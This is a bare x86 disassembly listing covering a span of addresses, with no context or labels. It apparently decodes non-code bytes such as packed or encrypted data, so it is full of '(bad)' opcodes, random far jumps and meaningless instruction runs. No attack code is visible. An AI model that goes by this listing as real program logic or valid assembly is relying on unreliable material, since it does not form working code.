  425ea8:	and    eax,ecx
  425eaa:	and    ebx,DWORD PTR [edi-0x6d]
  425ead:	lahf   
  425eae:	dec    ecx
  425eaf:	enter  0x46c,0x3c
  425eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425eb4:	adc    eax,0x8bd5a430
  425eb9:	sub    BYTE PTR [ebx-0x16b4898d],al
  425ebf:	cmp    ebp,0x1798ab3f
  425ec5:	jmp    0xb326a53d
  425eca:	daa    
  425ecb:	aaa    
  425ecc:	neg    DWORD PTR [ebp+eax*4-0x35]
  425ed0:	mov    BYTE PTR [edi-0x52],dh
  425ed3:	adc    DWORD PTR [eax+eax*8],edi
  425ed6:	stc    
  425ed7:	sbb    dl,BYTE PTR ds:0x896a7ddf
  425edd:	xchg   BYTE PTR [edi+esi*8+0x54],bl
  425ee1:	push   cs
  425ee2:	mov    eax,ds:0xeccebf22
  425ee7:	cmp    BYTE PTR [edx],ah
  425ee9:	dec    ebp
  425eea:	ss fwait
  425eec:	sbb    esp,ebp
	...
  425f56:	(bad)  
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	jae    0x425fe3
  425f64:	retf   0x67c6
  425f67:	xchg   edi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	pusha  
  425f6f:	add    cl,BYTE PTR [ebx+eax*1]
  425f72:	imul   edi,DWORD PTR [ebx],0x5c
  425f75:	mov    esp,0x1e721103
  425f7a:	or     BYTE PTR [ecx],0x55
  425f7d:	leave  
  425f7e:	nop
  425f7f:	mov    bh,0x42
  425f81:	pop    ecx
  425f82:	mov    BYTE PTR [edx-0x522bb500],al
  425f88:	pop    ebp
  425f89:	pusha  
  425f8a:	fild   DWORD PTR [esp+eiz*4]
  425f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f8e:	fnsave [edi]
  425f90:	push   0x295c1b55
  425f95:	push   edx
  425f96:	fwait
  425f97:	sahf   
  425f98:	scas   al,BYTE PTR es:[edi]
  425f99:	push   ebp
  425f9a:	jmp    0x425f56
  425f9c:	arpl   ax,bp
  425f9e:	pop    es
  425f9f:	xor    DWORD PTR [eax+eax*8],0xffffffe9
  425fa3:	test   dl,0x68
  425fa6:	pop    esp
  425fa7:	push   0xfadfbee
  425fac:	shl    edi,1
  425fae:	pop    es
  425faf:	stos   BYTE PTR es:[edi],al
  425fb0:	(bad)  
  425fb1:	xor    BYTE PTR [edx-0x2e],dl
  425fb4:	std    
  425fb5:	jge    0x425fcd
  425fb7:	rcr    ah,1
  425fb9:	mov    bh,0x13
  425fbb:	push   ecx
  425fbc:	cmc    
  425fbd:	cmp    BYTE PTR [esp+esi*8-0xc644af2],cl
  425fc4:	xchg   edx,eax
  425fc5:	test   DWORD PTR [eax+0x6aad2b0c],edx
  425fcb:	jns    0x42602c
  425fcd:	sbb    al,BYTE PTR [edi]
  425fcf:	add    edx,ebx
  425fd1:	push   ebp
  425fd2:	mov    cl,0xee
  425fd4:	iret   
  425fd5:	neg    BYTE PTR [ecx+0x5a]
  425fd8:	adc    edx,ebp
  425fda:	jp     0x425fc5
  425fdc:	cld    
  425fdd:	jg     0x425fd0
  425fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fe0:	(bad)  
  425fe2:	push   ecx
  425fe3:	inc    eax
  425fe4:	fmul   DWORD PTR [edx]
  425fe6:	xchg   ecx,eax
  425fe7:	xor    al,0x2
  425fe9:	ja     0x425f89
  425feb:	cli    
  425fec:	dec    esi
  425fed:	inc    esp
  425fee:	add    al,ah
  425ff0:	mov    ebp,0xf964dafc
  425ff5:	and    al,0x43
  425ff7:	jo     0x425ffc
  425ff9:	pop    edx
  425ffa:	sub    DWORD PTR [ecx],0xffffffec
  425ffd:	and    BYTE PTR [ecx+0x73],cl
  426000:	pushf  
  426001:	scas   al,BYTE PTR es:[edi]
  426002:	push   es
  426003:	cwde   
  426004:	pop    ds
  426005:	test   DWORD PTR [esp+edi*2-0x24],edx
  426009:	xor    DWORD PTR [eax+eiz*8],ebx
  42600c:	inc    eax
  42600d:	neg    BYTE PTR fs:[eax+0x195f6cde]
  426014:	call   0xabb4:0xe74e4655
  42601b:	push   ecx
  42601c:	or     eax,0xd1ed973d
  426021:	and    dl,BYTE PTR [ebp+0x3f83747]
  426027:	cmp    al,0x0
  426029:	xor    BYTE PTR [eax+0x2a193bab],0x7
  426030:	les    edx,FWORD PTR [edx+0x7c]
  426033:	or     BYTE PTR [eax-0x7a6f99e],ah
  426039:	lahf   
  42603a:	fnstenv [ebp+0x7f]
  42603d:	push   ebx
  42603e:	bound  ecx,QWORD PTR [ebx]
  426040:	sbb    eax,0x2eec9ac2
  426045:	dec    ecx
  426046:	rol    esi,cl
  426048:	push   ebp
  426049:	sar    bl,cl
  42604b:	xchg   edi,eax
  42604c:	or     al,0x9d
  42604e:	arpl   WORD PTR [edx+0x4d],si
  426051:	pop    ebp
  426052:	in     eax,0x69
  426054:	inc    edx
  426055:	stc    
  426056:	jb     0x426027
  426058:	int    0x2
  42605a:	mov    bh,0xa6
  42605c:	sbb    DWORD PTR [ecx],0xffffffd3
  42605f:	sub    bl,BYTE PTR [ecx+0xbbebf5e]
  426065:	mov    edi,0xb484620b
  42606a:	pop    edx
  42606b:	and    dh,dh
  42606d:	mov    esp,0x0
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	aaa    
  4260e3:	xchg   ebx,eax
  4260e4:	fwait
  4260e5:	shl    BYTE PTR [edi-0x68],1
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	mov    bl,0x14
  4260f0:	push   cs
  4260f1:	scas   eax,DWORD PTR es:[edi]
  4260f2:	lock mov edx,gs
  4260f5:	mov    ds:0x7e981933,eax
  4260fa:	jle    0x426102
  4260fc:	mov    DWORD PTR ds:0x3677c690,esi
  426102:	out    0x5e,eax
  426104:	dec    esp
  426105:	dec    eax
  426106:	loope  0x4260d7
  426108:	mov    ebx,0x151b077
  42610d:	inc    ecx
  42610e:	mov    dl,0xb4
  426110:	fadd   QWORD PTR [edx+0x4d8e67ed]
  426116:	gs dec ebp
  426118:	mov    al,0xd4
  42611a:	fsubr  QWORD PTR [ebp+edi*8-0xd]
  42611e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42611f:	pop    esp
  426120:	xor    eax,ebx
  426122:	xchg   esi,eax
  426123:	adc    esi,DWORD PTR [esi]
  426125:	lods   al,BYTE PTR ds:[esi]
  426126:	neg    DWORD PTR [eax]
  426128:	(bad)  
  426129:	fwait
  42612a:	mov    al,ds:0x2812024e
  42612f:	inc    esi
  426130:	repz or dl,bh
  426133:	loop   0x4260cd
  426135:	push   esp
  426136:	sti    
  426137:	lock fwait
  426139:	jl     0x42611e
  42613b:	daa    
  42613c:	test   DWORD PTR [ecx+eax*1],eax
  42613f:	fwait
  426140:	xor    al,0x9e
  426142:	sbb    al,0x30
  426144:	dec    esp
  426145:	idiv   DWORD PTR [edi+0x2a0b34b]
  42614b:	call   esp
  42614d:	xchg   ebx,eax
  42614e:	sbb    eax,0x5f4b2ed2
  426153:	mov    ecx,0x42efe23f
  426158:	jnp    0x4261a9
  42615a:	add    ebp,edx
  42615c:	jae    0x426155
  42615e:	scas   al,BYTE PTR es:[edi]
  42615f:	int    0xe3
  426161:	jne    0x426108
  426163:	sti    
  426164:	imul   esi,DWORD PTR [ecx-0x67],0xffffffdc
  426168:	popf   
  426169:	add    cl,BYTE PTR [eax-0x59]
  42616c:	and    ebp,edx
  42616e:	js     0x42615b
  426170:	add    eax,DWORD PTR [ebx+0x14077abe]
  426176:	mov    al,0x90
  426178:	add    al,al
  42617a:	std    
  42617b:	test   BYTE PTR [edx+0x9de45a5],bl
  426181:	and    eax,0xa4edbb0b
  426186:	lds    edi,FWORD PTR [ecx+0x44177242]
  42618c:	es pushf 
  42618e:	mov    dl,0x2c
  426190:	sub    dh,ch
  426192:	jnp    0x426150
  426194:	and    eax,0x1ba7dca1
  426199:	cmp    eax,0x28d14df4
  42619e:	adc    DWORD PTR [eax+0x58],esp
  4261a1:	stc    
  4261a2:	push   ebp
  4261a3:	test   al,0xd9
  4261a5:	inc    esp
  4261a6:	lds    esp,FWORD PTR [ecx]
  4261a8:	adc    al,0x80
  4261aa:	fld    TBYTE PTR [edx]
  4261ac:	lahf   
  4261ad:	inc    edx
  4261ae:	mov    eax,ds:0xc3639aaf
  4261b3:	mov    ah,0x77
  4261b5:	push   ecx
  4261b6:	push   ebp
  4261b7:	ds push cs
  4261b9:	div    BYTE PTR [ebx]
  4261bb:	mov    bl,0x1e
  4261bd:	outs   dx,DWORD PTR ds:[esi]
  4261be:	mov    DWORD PTR [edx],esp
  4261c0:	inc    ecx
  4261c1:	sub    eax,0xbf2a6173
  4261c6:	jmp    0x1c8f37c3
  4261cb:	mov    eax,DWORD PTR [ebx-0x80]
  4261ce:	xlat   BYTE PTR ds:[ebx]
  4261cf:	add    BYTE PTR [ebp+0x132d9886],bh
  4261d5:	cmc    
  4261d6:	aaa    
  4261d7:	(bad)  
  4261d8:	loop   0x42622a
  4261da:	hlt    
  4261db:	jns    0x42616c
  4261dd:	lock inc DWORD PTR [ecx-0xc]
  4261e1:	in     al,0x0
  4261e3:	push   ss
  4261e4:	popa   
  4261e5:	mov    ds:0xb09b0f9c,eax
  4261ea:	pop    ebx
  4261eb:	mov    esi,0x4487
	...
  426254:	add    BYTE PTR [eax],al
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx+0x10a9eb27],0xffffffc6
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	pop    ebp
  42626f:	jge    0x4262bb
  426271:	add    eax,0x4feedaf7
  426276:	mov    ebx,0x8399fab7
  42627b:	jl     0x4262bd
  42627d:	or     al,BYTE PTR [ecx+ecx*1]
  426280:	cmc    
  426281:	push   edx
  426282:	icebp  
  426283:	sub    esi,0x3d
  426286:	fndisi(8087 only) 
  426288:	pusha  
  426289:	xchg   edi,eax
  42628a:	pop    ebx
  42628b:	hlt    
  42628c:	pop    ebx
  42628d:	lea    ecx,[ebp-0x62]
  426290:	loop   0x426311
  426292:	mov    al,0xc1
  426294:	imul   eax,DWORD PTR [edx+0x5c362e71],0x7b1c45a1
  42629e:	jmp    0x2e976250
  4262a3:	sbb    BYTE PTR [ecx],dh
  4262a5:	shl    DWORD PTR [ebp+0x2036423f],0x5f
  4262ac:	and    bh,BYTE PTR [ecx+0x659ef757]
  4262b2:	push   0xacf55914
  4262b7:	int3   
  4262b8:	outs   dx,DWORD PTR ds:[esi]
  4262b9:	jno    0x4262d5
  4262bb:	jb     0x42632b
  4262bd:	repnz or dh,dh
  4262c0:	ins    BYTE PTR es:[edi],dx
  4262c1:	inc    ebx
  4262c2:	sbb    al,BYTE PTR [edi+0x333111e6]
  4262c8:	mov    edi,0x1546f6d3
  4262cd:	std    
  4262ce:	mov    al,ds:0x89b9713f
  4262d3:	outs   dx,DWORD PTR ds:[esi]
  4262d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262d5:	(bad)  
  4262d6:	xchg   ecx,eax
  4262d7:	addr16 and eax,0x54d423d8
  4262dd:	shl    esp,0xe7
  4262e0:	and    al,ah
  4262e2:	stos   DWORD PTR es:[edi],eax
  4262e3:	adc    BYTE PTR [ecx+0x7c1aa48c],dh
  4262e9:	popa   
  4262ea:	inc    edi
  4262eb:	daa    
  4262ec:	bswap  edi
  4262ee:	or     BYTE PTR [edx-0x71557df0],bh
  4262f4:	dec    ebp
  4262f5:	repnz add eax,0xfe33cec2
  4262fb:	adc    eax,0x254bc2a9
  426300:	imul   ebx,DWORD PTR [ebp+0x500413b4],0x8a33e799
  42630a:	sub    dl,bl
  42630c:	mov    ch,0xc7
  42630e:	(bad)  
  426310:	mov    edx,ebx
  426312:	arpl   WORD PTR [ebp-0x60],bx
  426315:	(bad)  
  426317:	push   ecx
  426318:	inc    ebx
  426319:	cs sar edi,0xfa
  42631d:	retf   
  42631e:	les    edx,FWORD PTR [eax+0x7f2f0cad]
  426324:	xchg   esi,eax
  426325:	jge    0x42633f
  426327:	(bad)  
  426329:	icebp  
  42632a:	mov    al,ds:0xc9bd8a75
  42632f:	mov    DWORD PTR [ecx],eax
  426331:	lds    esp,FWORD PTR [esi-0x66]
  426334:	sub    BYTE PTR [edx-0x77cee897],al
  42633a:	repnz retf 
  42633c:	push   cs
  42633d:	cdq    
  42633e:	cdq    
  42633f:	out    0xbf,eax
  426341:	stos   DWORD PTR es:[edi],eax
  426342:	push   edi
  426343:	sbb    al,0xe3
  426345:	imul   esi,esp,0xfffffff9
  426348:	jo     0x426359
  42634a:	pop    ebx
  42634b:	hlt    
  42634c:	add    al,0xcc
  42634e:	jecxz  0x4262f5
  426350:	or     edx,edx
  426352:	ins    BYTE PTR es:[edi],dx
  426353:	(bad)  
  426355:	adc    al,0xc7
  426357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426359:	retf   
  42635a:	jo     0x4263d0
  42635c:	dec    edi
  42635d:	int3   
  42635e:	fdivr  DWORD PTR [edx]
  426360:	mov    bl,0xdf
  426362:	aam    0x3d
  426364:	sub    DWORD PTR [edi+0x33],0xffffff9a
  426368:	(bad)  
  426369:	arpl   WORD PTR [ebx+0x955526],ax
	...
  4263d3:	add    BYTE PTR [eax],al
  4263d5:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4263d9:	dec    esi
  4263da:	std    
  4263db:	out    dx,al
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x6c40b6b5
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	and    al,0x6
  4263f0:	mov    ebp,DWORD PTR [edi]
  4263f2:	sub    eax,0xcbb27c7f
  4263f7:	and    edi,DWORD PTR [ebx+0x1f]
  4263fa:	push   edi
  4263fb:	call   0x113d9a34
  426400:	(bad)  
  426401:	jnp    0x42640b
  426403:	ror    DWORD PTR [esp+esi*2],1
  426406:	(bad)  
  426407:	sub    al,ah
  426409:	outs   dx,BYTE PTR ds:[esi]
  42640a:	mov    al,0xd6
  42640c:	add    eax,0x9d386da
  426411:	cvtps2pd xmm1,xmm0
  426414:	lds    ebx,FWORD PTR [ebx+0x33]
  426417:	pop    ebp
  426418:	hlt    
  426419:	sub    esi,DWORD PTR [ecx]
  42641b:	hlt    
  42641c:	shl    ecx,0x9a
  42641f:	inc    esp
  426420:	popa   
  426421:	pop    es
  426422:	iret   
  426423:	mov    eax,0xcb3add7a
  426428:	shl    BYTE PTR [esi+0x6eef7a3d],0x9
  42642f:	arpl   WORD PTR [edi-0x321d768b],bp
  426435:	adc    bh,BYTE PTR [ebp+0x477b1edc]
  42643b:	cmp    al,0x8f
  42643d:	pop    ss
  42643e:	push   ebx
  42643f:	fsub   DWORD PTR [edi]
  426441:	mov    esp,0xb7b3c0c5
  426446:	push   ebp
  426447:	push   ebx
  426448:	aas    
  426449:	test   eax,0x68a7f027
  42644e:	gs std 
  426450:	mov    bh,0x65
  426452:	adc    bl,cl
  426454:	fstp   DWORD PTR [esi-0xe]
  426457:	mov    dh,0x7b
  426459:	test   eax,0x2dc1783c
  42645e:	and    eax,0x8709f745
  426463:	in     al,0x1d
  426465:	add    al,0xe1
  426467:	mov    ds:0xc21baad8,al
  42646c:	inc    eax
  42646d:	inc    BYTE PTR [eax]
  42646f:	lock jne 0x4264b7
  426472:	leave  
  426473:	repz call 0x5fd4:0x2b10108e
  42647b:	repnz aaa 
  42647d:	jmp    0xb6c079d6
  426482:	cmp    esp,eax
  426484:	mov    bl,0xdb
  426486:	and    bl,ah
  426488:	pushf  
  426489:	inc    esi
  42648a:	inc    eax
  42648b:	mov    bl,0xed
  42648d:	dec    eax
  42648e:	adc    DWORD PTR [edi+0x0],0xb782056e
  426495:	mov    dh,BYTE PTR [eax+0x1b9e0a94]
  42649b:	inc    ebp
  42649c:	das    
  42649d:	nop
  42649e:	sub    eax,DWORD PTR [ebx-0x74]
  4264a1:	test   DWORD PTR [eax],ebx
  4264a3:	aaa    
  4264a4:	xchg   ebp,eax
  4264a5:	(bad)  
  4264a6:	(bad)  [edi+0x535470f8]
  4264ac:	push   ebp
  4264ad:	sti    
  4264ae:	push   eax
  4264af:	or     eax,0xf2ada1ab
  4264b4:	stc    
  4264b5:	and    esi,DWORD PTR [esp+edx*1]
  4264b8:	push   esp
  4264b9:	sub    eax,0x5cfe5ff9
  4264be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264bf:	sbb    dh,BYTE PTR [edi]
  4264c1:	mov    ebp,0x407764bb
  4264c6:	(bad)  
  4264c7:	sbb    BYTE PTR [ecx-0x5d],cl
  4264ca:	adc    edx,ecx
  4264cc:	out    dx,al
  4264cd:	jmp    0x6372:0xaf7e9a71
  4264d4:	not    DWORD PTR [ebx+0x25b85779]
  4264da:	lods   eax,DWORD PTR ds:[esi]
  4264db:	add    eax,edx
  4264dd:	les    edi,FWORD PTR [esi-0x1cf88a29]
  4264e3:	mov    cl,0xcd
  4264e5:	mov    ebp,0xb9ce50c6
  4264ea:	cmp    bh,BYTE PTR [eax]
  4264ec:	jmp    0x42650a
	...
  426555:	add    BYTE PTR [ecx+0x6f],ch
  426558:	mov    BYTE PTR [eax],cl
  42655a:	mov    gs,edi
  42655c:	jmp    0x8abb74d0
  426561:	test   DWORD PTR [edx+0x67b5fe46],edi
  426567:	fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	fstp   TBYTE PTR [eax]
  426570:	jnp    0x4265e0
  426572:	mov    eax,ds:0x666859cd
  426577:	addr16 jo 0x42653b
  42657a:	popa   
  42657b:	xchg   ebx,eax
  42657c:	cmc    
  42657d:	out    0x41,eax
  42657f:	fcomp  st(6)
  426581:	fcomp  st(5)
  426583:	mov    dl,0xf1
  426585:	mov    edi,0x13f19889
  42658a:	int    0xe1
  42658c:	adc    eax,0xef45cf4a
  426591:	repz in al,0x29
  426594:	popa   
  426595:	idiv   DWORD PTR [eax-0x7227b303]
  42659b:	dec    esp
  42659c:	push   ds
  42659d:	fs inc ebx
  42659f:	arpl   cx,dx
  4265a1:	sub    al,0x7d
  4265a3:	arpl   ax,ax
  4265a5:	xchg   esi,esp
  4265a7:	fimul  DWORD PTR [eax-0x7bbe8579]
  4265ad:	and    eax,0xba92bef
  4265b2:	xchg   dh,bh
  4265b4:	pop    ebx
  4265b5:	jns    0x42660e
  4265b7:	or     eax,0xcf79a88d
  4265bc:	imul   esi,DWORD PTR [ebp+edi*2-0x7a],0x57070469
  4265c4:	mov    cl,ah
  4265c6:	(bad)  
  4265c8:	push   edx
  4265c9:	(bad)  
  4265ca:	xchg   ecx,eax
  4265cb:	add    dh,BYTE PTR ds:0x3b5d4c8c
  4265d1:	cmp    DWORD PTR [edx-0x51],0x8903e7c9
  4265d8:	addr16 xchg ecx,eax
  4265da:	mov    ebp,0xe6a7746d
  4265df:	outs   dx,DWORD PTR ds:[esi]
  4265e0:	cld    
  4265e1:	cmp    eax,0x26f17544
  4265e6:	dec    ebx
  4265e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265e8:	loope  0x426614
  4265ea:	shr    DWORD PTR [edx],1
  4265ec:	or     edx,DWORD PTR [edx-0x29]
  4265ef:	push   ebx
  4265f0:	xchg   edx,edi
  4265f2:	mov    dl,0x39
  4265f4:	(bad)  
  4265f5:	ins    DWORD PTR es:[edi],dx
  4265f6:	sub    edi,ecx
  4265f8:	aad    0xe0
  4265fa:	mov    edx,0x67e3900b
  4265ff:	xchg   ebx,eax
  426600:	cli    
  426601:	dec    eax
  426602:	pop    ebx
  426603:	sub    ebx,DWORD PTR [edi-0x973c9a8]
  426609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42660a:	fild   DWORD PTR [ebx+edx*8-0x1f]
  42660e:	sub    DWORD PTR [ebx],ebx
  426610:	loop   0x42660c
  426612:	xor    ch,BYTE PTR [ebp-0x40]
  426615:	or     al,0x50
  426617:	lods   al,BYTE PTR ds:[esi]
  426618:	push   esp
  426619:	in     eax,dx
  42661a:	or     eax,0xda395a97
  42661f:	push   edx
  426620:	mov    cl,0x72
  426622:	sub    ebx,ebp
  426624:	cmp    DWORD PTR [eax+0x29a2f4b5],0x51634a52
  42662e:	pop    eax
  42662f:	mov    al,BYTE PTR [edi+0x66b7c13d]
  426635:	(bad)
  42663a:	or     BYTE PTR [ebx],0xae
  42663d:	cmp    al,BYTE PTR [esp+eiz*8]
  426640:	add    eax,0xdd8ddac
  426645:	hlt    
  426646:	add    BYTE PTR [ecx+0x6],ah
  426649:	(bad)  
  42664a:	jecxz  0x4265ef
  42664c:	sahf   
  42664d:	call   0xec49:0x466323f6
  426654:	adc    DWORD PTR [edx+0x35ade587],edi
  42665a:	lock inc esi
  42665c:	faddp  st(4),st
  42665e:	jl     0x426609
  426660:	jmp    0xe96f721f
  426665:	imul   ebp,DWORD PTR [ebx-0x6a],0x21
  426669:	push   esi
  42666a:	mov    bl,al
  42666c:	leave  
  42666d:	add    al,0x0
	...
  4266d3:	add    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [edx],dl
  4266d7:	retf   
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0x6856da4]
  4266e4:	push   0x5
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	je     0x426765
  4266f0:	rol    DWORD PTR [esp+edi*8],cl
  4266f3:	jno    0x4266c3
  4266f5:	scas   eax,DWORD PTR es:[edi]
  4266f6:	test   BYTE PTR [eax],bh
  4266f8:	fisttp WORD PTR [edi]
  4266fa:	mov    eax,0x4563da14
  4266ff:	mov    al,ds:0x4f6243c4
  426704:	sbb    al,0x7c
  426706:	mov    ds:0xf7758b78,al
  42670b:	mov    dl,0xce
  42670d:	retf   0x3937
  426710:	(bad)  
  426711:	cdq    
  426712:	pop    es
  426713:	and    ch,bl
  426715:	jo     0x426741
  426717:	xor    eax,0x694ae928
  42671c:	or     cl,BYTE PTR ds:0xedbb5a4a
  426722:	enter  0x6b0e,0x95
  426726:	and    eax,0xb282d867
  42672b:	jl     0x4266eb
  42672d:	mov    eax,ds:0xcd607f88
  426732:	in     al,0x50
  426734:	shl    DWORD PTR [ebp+0x20],cl
  426737:	out    0xa2,eax
  426739:	sub    bl,ah
  42673b:	jns    0x4267b1
  42673d:	cmp    eax,0x1cee9d1e
  426742:	mov    esi,0xc1680fd4
  426747:	mov    cl,0x90
  426749:	cmp    eax,0x9a0adce8
  42674e:	sbb    BYTE PTR [ebp+0x0],dl
  426751:	dec    esp
  426753:	sahf   
  426754:	fidiv  DWORD PTR [edi+0x62]
  426757:	gs cs stos BYTE PTR es:[edi],al
  42675a:	sub    DWORD PTR [edi-0x7a],ebx
  42675d:	adc    eax,0xfd828a24
  426762:	inc    edx
  426763:	lea    esp,[eax]
  426765:	int    0x83
  426767:	bnd je 0x4266fb
  42676a:	pop    edx
  42676b:	cmc    
  42676c:	(bad)  
  42676d:	jmp    0x2b850ade
  426772:	nop
  426773:	mov    cl,0x99
  426775:	cdq    
  426776:	int3   
  426777:	mul    ch
  426779:	mov    ebx,0x9dfae088
  42677e:	push   esi
  42677f:	and    ah,BYTE PTR [ecx-0x7e]
  426782:	sbb    DWORD PTR [ebp-0x76a48b74],edi
  426788:	fcom   st(2)
  42678a:	jmp    0x598f59cd
  42678f:	retf   
  426790:	adc    al,0xfa
  426792:	cmp    ah,al
  426794:	mov    al,ds:0x43c1ed60
  426799:	out    dx,eax
  42679a:	dec    ecx
  42679b:	into   
  42679c:	lea    edi,[edi]
  42679e:	sti    
  42679f:	sub    bl,dl
  4267a1:	fsubr  QWORD PTR [ebp+0x5c]
  4267a4:	cmp    eax,0xb6ae2cf0
  4267a9:	pop    edx
  4267aa:	mov    esp,0xdaee7d60
  4267af:	inc    ebx
  4267b0:	xor    BYTE PTR [ebp+esi*8+0x72a5dc0],dl
  4267b7:	pop    edx
  4267b8:	inc    ebp
  4267b9:	and    eax,0x872147e1
  4267be:	cmp    bh,cl
  4267c0:	mov    cl,0xb8
  4267c2:	cmp    al,0x8e
  4267c4:	(bad)  [ebx-0x20]
  4267c7:	popa   
  4267c8:	nop
  4267c9:	shl    ebx,0x50
  4267cc:	(bad)  
  4267cd:	fwait
  4267ce:	jl     0x4267fd
  4267d0:	or     ebp,ebx
  4267d2:	mov    al,ds:0xa41c78e2
  4267d7:	pop    edi
  4267d8:	xchg   DWORD PTR [esi+ecx*2-0x47],eax
  4267dc:	div    BYTE PTR [edx-0x2b]
  4267df:	mov    eax,ds:0xa3a484f8
  4267e4:	sub    edx,DWORD PTR [edi]
  4267e6:	mov    eax,0x9c28f921
  4267eb:	mov    ah,0x5a
  4267ed:	mov    bl,0x0
	...
  426853:	add    BYTE PTR [eax],al
  426855:	add    BYTE PTR [eax-0xd53173],bh
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	mov    ds:0x675fae4e,al
  426867:	popf   
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	out    0x65,eax
  426870:	push   cs
  426871:	mov    ch,0x69
  426873:	push   ss
  426874:	inc    edi
  426875:	add    eax,0x9dc4e466
  42687a:	inc    esi
  42687b:	fisub  DWORD PTR [ebp+0x28b67c37]
  426881:	shl    BYTE PTR [ebp+0x41],cl
  426884:	ds test eax,0xf2242fff
  42688a:	scas   al,BYTE PTR es:[edi]
  42688b:	or     bl,bh
  42688d:	cdq    
  42688e:	dec    edx
  42688f:	push   0x32
  426891:	fsub   st,st(2)
  426893:	adc    cl,bl
  426895:	fwait
  426896:	jo     0x4268bc
  426898:	push   ebp
  426899:	mov    esi,0x8b0dda4f
  42689e:	xlat   BYTE PTR ds:[ebx]
  42689f:	jnp    0x426916
  4268a1:	stc    
  4268a2:	je     0x426860
  4268a4:	rcr    BYTE PTR [eax+edi*2+0x71],1
  4268a8:	jecxz  0x4268ed
  4268aa:	or     eax,0x6ca8a46b
  4268af:	push   ebp
  4268b0:	call   0xcb2d1baf
  4268b5:	push   es
  4268b6:	int3   
  4268b7:	and    DWORD PTR [ebx+0x4d9a89b4],eax
  4268bd:	loopne 0x426851
  4268bf:	pop    ecx
  4268c0:	fcomp  DWORD PTR [ebx+ebx*1+0x59c7574]
  4268c7:	rcr    ch,1
  4268c9:	mov    esi,0xccd68f77
  4268ce:	(bad)  [ebx]
  4268d0:	jmp    0x4268e6
  4268d2:	outs   dx,BYTE PTR ds:[esi]
  4268d3:	pop    ebp
  4268d4:	push   edx
  4268d5:	data16 sti 
  4268d7:	adc    al,0x5d
  4268d9:	enter  0x221c,0xa2
  4268dd:	test   BYTE PTR [ebx+ebx*4],cl
  4268e0:	ja     0x4268aa
  4268e2:	mov    ah,0xed
  4268e4:	inc    eax
  4268e5:	dec    ebp
  4268e6:	add    cl,al
  4268e8:	jmp    0x4268bf
  4268ea:	mov    al,0x8a
  4268ec:	(bad)  
  4268ed:	shl    DWORD PTR [eax-0x27a8ad84],1
  4268f3:	xor    edi,eax
  4268f5:	aas    
  4268f6:	xlat   BYTE PTR ds:[ebx]
  4268f7:	ret    0x9019
  4268fa:	mov    esi,0x23aa2c6b
  4268ff:	xor    DWORD PTR [ebp-0x72b22f62],edx
  426905:	sub    eax,0x5066c222
  42690a:	inc    edi
  42690b:	shr    DWORD PTR [edi-0x1],0x52
  42690f:	pop    ebx
  426910:	push   ebp
  426911:	ret    0x2044
  426914:	cmp    eax,0xfe698bca
  426919:	sub    edx,DWORD PTR [edx+edi*8]
  42691c:	jns    0x4268f7
  42691e:	sti    
  42691f:	mov    ds:0xe65ab92,al
  426924:	gs test al,0x9f
  426927:	dec    ebx
  426928:	push   eax
  426929:	xchg   edi,eax
  42692a:	dec    ebp
  42692b:	and    DWORD PTR [ebp+0x2e],edx
  42692e:	stos   DWORD PTR es:[edi],eax
  42692f:	cmp    al,BYTE PTR [ecx+0x43f66783]
  426935:	pop    edi
  426936:	lahf   
  426937:	outs   dx,DWORD PTR ds:[esi]
  426938:	call   0xdabc:0xc72b3d7
  42693f:	fs stos DWORD PTR es:[edi],eax
  426941:	push   ebx
  426942:	bound  ecx,QWORD PTR [eax-0x26]
  426945:	icebp  
  426946:	push   edx
  426947:	add    DWORD PTR [edi],edi
  426949:	fistp  QWORD PTR [eax*4+0x5b2722af]
  426950:	shl    DWORD PTR [edx-0x686f5de6],cl
  426956:	xchg   edx,eax
  426957:	pop    eax
  426958:	xor    ch,BYTE PTR [edi+0x4e0f52c3]
  42695e:	jmp    0x8815:0xd07f941f
  426965:	jecxz  0x4268ea
